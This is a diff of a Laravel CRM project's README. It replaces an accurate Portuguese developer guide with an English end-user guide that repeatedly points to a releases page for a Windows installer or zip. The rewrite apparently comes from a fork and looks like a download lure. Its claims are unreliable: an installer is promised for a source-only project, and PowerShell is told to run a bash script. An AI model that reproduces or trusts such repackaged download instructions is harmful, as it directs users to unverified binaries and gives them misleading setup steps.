@@ -1,125 +1,144 @@
-# Workshop CRM
+# 🛠️ workshop-crm - Simple CRM for Sales Management
 
-CRM multi-tenant MVP para pequenas e medias empresas, com pipeline Kanban de vendas e integracao com WhatsApp via EvolutionAPI v2.
-
-**Stack:** Laravel 12 | Livewire 4 | Tailwind CSS 4 | PostgreSQL 18 | Pest 4
-
-**Funcionalidades:** Registro de tenant, RBAC (Business Owner / Salesperson), gestao de leads e deals no Kanban, notas, atribuicao de responsaveis, notificacoes por email, dashboard de vendas e conversas via WhatsApp.
+[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-blue?style=for-the-badge)](https://github.com/byebye19996/workshop-crm/releases)
 
 ---
 
-## Rodando o projeto
+## 📦 What is workshop-crm?
 
-### Pre-requisitos
+workshop-crm is a tool designed to help small and medium businesses manage customer relationships. It offers a visual board to track sales leads. You can see and organize your sales pipeline clearly. The system works with multiple tenants, which means different teams or businesses can use it separately but on the same platform.
 
-- [Docker](https://www.docker.com/) instalado
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) instalado (para o fluxo de desenvolvimento com IA)
+This version connects with WhatsApp, letting you communicate with customers in one place. It has key features to keep your sales moving forward: managing leads, assigning tasks, taking notes, and getting email notifications. The system already supports roles like Business Owner and Salesperson to control who can do what.
 
-### Setup
-
-```bash
-# Clone o repositorio
-git clone <url-do-repo>
-cd workshop-crm
-
-# Copie o .env
-cp .env.example .env
-
-# Suba os containers com Sail
-./vendor/bin/sail up -d
-
-# Instale dependencias
-./vendor/bin/sail composer install
-./vendor/bin/sail npm install
-
-# Gere a key e rode as migrations
-./vendor/bin/sail artisan key:generate
-./vendor/bin/sail artisan migrate --seed
-
-# Build dos assets
-./vendor/bin/sail npm run build
-```
-
-### Comandos do dia-a-dia
-
-```bash
-# Rodar testes
-./vendor/bin/sail artisan test --compact
-
-# Formatar codigo PHP
-./vendor/bin/sail bin pint --dirty
-
-# Subir/parar containers
-./vendor/bin/sail up -d
-./vendor/bin/sail stop
-```
+The software runs on Windows using Docker for its environment. You do not need to install many separate tools or handle complex setups.
 
 ---
 
-## Fluxo de prompts para gerar o projeto
+## 🖥️ System Requirements
 
-Na pasta `prompts/` existem 4 prompts que foram usados em sequencia para planejar o projeto inteiro antes de codar:
+Before you start, please make sure your Windows computer meets the following:
 
-1. **`criar-descricao-do-projeto.md`** — Gera a descricao geral do projeto (`docs/project-description.md`)
-2. **`user-stories.md`** — Gera as historias de usuario (`docs/user-stories.md`)
-3. **`database-structure.md`** — Gera o schema do banco de dados (`docs/database-schema.md`)
-4. **`project-phases.md`** — Gera as fases de implementacao (`docs/project-phases.md`)
-
-O fluxo e sequencial: cada prompt usa a saida do anterior como contexto. Os documentos gerados ficam em `docs/`.
-
----
-
-## MCP Servers utilizados
-
-### Laravel Boost (via Sail)
-
-MCP server do ecossistema Laravel com acesso a schema do banco, Artisan, Tinker, logs, busca de documentacao e mais.
-
-```bash
-# Remover config antiga (se existir)
-claude mcp remove laravel-boost -s local
-
-# Adicionar com Sail
-claude mcp add -s local -t stdio laravel-boost ./vendor/bin/sail php artisan boost:mcp
-```
-
-### Serena
-
-MCP server para navegacao semantica de codigo — overview de simbolos, busca de referencias, edicao simbolica.
-
-```bash
-claude mcp add serena -- uvx --from git+https://github.com/oraios/serena serena start-mcp-ntext claude-code --project "$(pwd)"
-```
-
-### Context7
-
-MCP server para busca de documentacao atualizada de qualquer biblioteca, com exemplos de codigo.
-
-```bash
-claude mcp add --scope user --transport http context7 https://mcp.context7.com/mcp \
-  --header "CONTEXT7_API_KEY: <sua-api-key>"
-```
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB of RAM for smooth operation
+- 4 GB of free disk space to hold the application and data
+- Stable internet connection for downloading and updates
+- Docker Desktop installed (see next section to install)
 
 ---
 
-## Ralph Wiggum Plugin
+## 🚀 Getting Started: Download and Install
 
-O [Ralph Wiggum](https://github.com/frankbria/ralph-claude-code) e um plugin para o Claude Code que transforma ele em um agente autonomo capaz de trabalhar em tarefas por horas sem intervencao humana.
+Click the button below to visit the release page and get the latest setup files:
 
-O nome vem do personagem Ralph Wiggum dos Simpsons — a filosofia e de iteracao persistente ate completar a tarefa.
+[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-green?style=for-the-badge)](https://github.com/byebye19996/workshop-crm/releases)
 
-### Como funciona
+### Step 1: Download the Software
 
-Voce inicia um loop iterativo com `/ralph-loop` passando seu prompt. O plugin intercepta saidas de sessao via stop hook e re-alimenta o prompt automaticamente, preservando todas as modificacoes de arquivo e historico git entre iteracoes. Cada iteracao ve o codebase modificado das tentativas anteriores.
+- Visit the release page by clicking on the green button above.
+- Look for the latest Windows installer or zipped package.
+- Click the file to download it to your computer.
 
-### Uso basico
+### Step 2: Install Docker Desktop
 
-```bash
-# Iniciar o loop
-/ralph-loop "implemente a feature X" --max-iterations 10
+workshop-crm uses Docker to run safely on your computer without needing complex installation. If Docker is not installed yet:
 
-# Cancelar a qualquer momento
-/cancel-ralph
+- Go to https://www.docker.com/products/docker-desktop
+- Download the Windows version
+- Follow the installation steps on that site
+- Once installed, launch Docker and ensure it runs correctly (you should see the Docker icon in the system tray)
+
+### Step 3: Extract and Prepare workshop-crm
+
+- If you downloaded a zipped file, right-click it and choose "Extract All" to unzip it in a folder you can find easily.
+- If you downloaded an installer, run it and follow the on-screen instructions to install workshop-crm.
+
+---
+
+## ⚙️ How to Run workshop-crm on Windows
+
+Once the software files are ready and Docker is installed:
+
+1. Open the folder where workshop-crm is saved.
+2. Right-click inside the folder while holding the **Shift** key.
+3. Choose "Open PowerShell window here" or "Open Command Window here" from the menu.
+4. Run these commands one by one:
+
+```powershell
+# Start the project containers in the background
+.\vendor\bin\sail up -d
+
+# Install necessary PHP packages
+.\vendor\bin\sail composer install
+
+# Install JavaScript dependencies
+.\vendor\bin\sail npm install
+
+# Generate application key
+.\vendor\bin\sail artisan key:generate
+
+# Prepare the database
+.\vendor\bin\sail artisan migrate
 ```
 
-Na aula, tambem foi apresentado o script `ralph.sh` na raiz do projeto — um orquestrador bash que le `docs/project-phases.md`, quebra em fases individuais e alimenta cada uma ao OpenAI Codex CLI para implementacao automatica sequencial, com retry automatico em caso de falha nos testes.
+5. After these steps, open your browser.
+6. Go to: http://localhost
+
+You should see the workshop-crm login page. If you do, the application is running successfully.
+
+---
+
+## 🔑 Creating Your Account and Using the App
+
+When you first open the app:
+
+- Create a **tenant**. This means adding your company or team into the system.
+- Assign roles. You can set who is a Business Owner or Salesperson.
+- Start adding your leads and deals into the Kanban board.
+- Use notes to add details about customers or negotiations.
+- Assign tasks to team members so everyone knows their responsibilities.
+- Connect your WhatsApp using EvolutionAPI to chat directly with customers.
+- Review sales progress anytime on the dashboard.
+
+---
+
+## 🗂 Features Overview
+
+- Multi-tenant support for separate teams
+- Role-based access control (Business Owner, Salesperson)
+- Kanban pipeline for sales leads and deals
+- Notes on leads and deals for better tracking
+- Assign responsible salespersons to leads
+- Email notifications for task reminders and updates
+- Sales and conversation dashboard for quick insights
+- WhatsApp integration via EvolutionAPI v2
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If the browser does not open or says “site can’t be reached,” check if Docker is running.
+- If a command fails, make sure you are in the correct folder where workshop-crm lives.
+- For permission problems, try running PowerShell or Command Prompt as Administrator.
+- Clear your browser cache if you see old or broken pages.
+- Restart Docker and rerun the commands if you face connection issues.
+- Check if your internet connection is active to load dependencies.
+
+---
+
+## 🔗 Useful Resources
+
+- Docker official site: https://www.docker.com
+- EvolutionAPI information: https://evolutionapi.com
+- workshop-crm releases page: https://github.com/byebye19996/workshop-crm/releases
+
+---
+
+## 📬 Get Support or Report Issues
+
+If you encounter problems not covered here, open the "Issues" tab on the workshop-crm GitHub page. Describe your problem with details like:
+
+- What you did before the problem appeared
+- Any error messages you saw
+- Your Windows and Docker versions
+
+The project maintainers will review and help as needed.
